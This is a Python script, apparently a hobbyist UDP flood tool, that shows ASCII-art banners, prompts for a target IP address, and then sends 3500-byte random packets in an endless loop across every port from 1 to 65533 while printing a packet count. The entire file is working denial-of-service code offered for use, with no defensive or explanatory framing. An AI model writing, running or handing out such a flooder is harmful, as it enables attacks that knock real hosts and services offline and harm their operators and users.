# -*- coding: utf-8 -*-              
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(" ")
print("  ___      ___   ___    ___   ___   ____________   _________   ")                                                
print(" | ::     | ::  | ::   | ::  | ::  | :::::::::::  | ::::::::   ")
print(" | ::     | ::  | ::   | ::  | ::       | ::      | ::————/    ")
print(" | ::  :: | ::  | :::::::::  | ::       | ::      | :::::::    ")
print(" | :: :: :: ::  | ::   | ::  | ::       | ::      | ::———/     ")
print(" | :::   \ :::  | ::   | ::  | ::       | ::      | ::::::::   ")
print("  \___    \___   \__    \__   \__        \__       \________   ")
print("                   __________     ___        _________  ___         _________ ")
print("                  | ::::::::     / :::     / ::::::::: | ::        | :::::::: ")
print("                  | ::—————/    / :: ::    | ::—————/  | ::        | ::————/  ")
print("                  | ::::::     / :: \ ::   | ::::::::: | ::        | :::::::  ")  
print("                  | ::——/     / :::::::::  | ::———| :: | ::        | ::———/   ")
print("                  | :::::::: / ::—————\ :: | ::::::::: | ::::::::: | :::::::  ")
print("                   \_________\___      \___ \________   \_________  \________ ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "" + N + "" + B + "" + R + "" + N)
print()
print("\033[32m==========================================================\033[0m")
print("\033[32m   @  @      @  @     @@  @      @@@@      @       @   @  \033[0m")
print("\033[33m   @@        @  @     @ @ @      @@@      @@@        @    \033[0m")
print("\033[33m   @  @       @@      @  @@      @       @   @       @    \033[0m")
print("\033[32m==========================================================\033[0m")
print("_________________________________________________________________")
ip = input("[+] Target's IP : ")
print("_________________________________________________________________")
os.system("clear")
print("_________________________________________________________________")
print("Attack starting...")
print("_________________________________________________________________")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
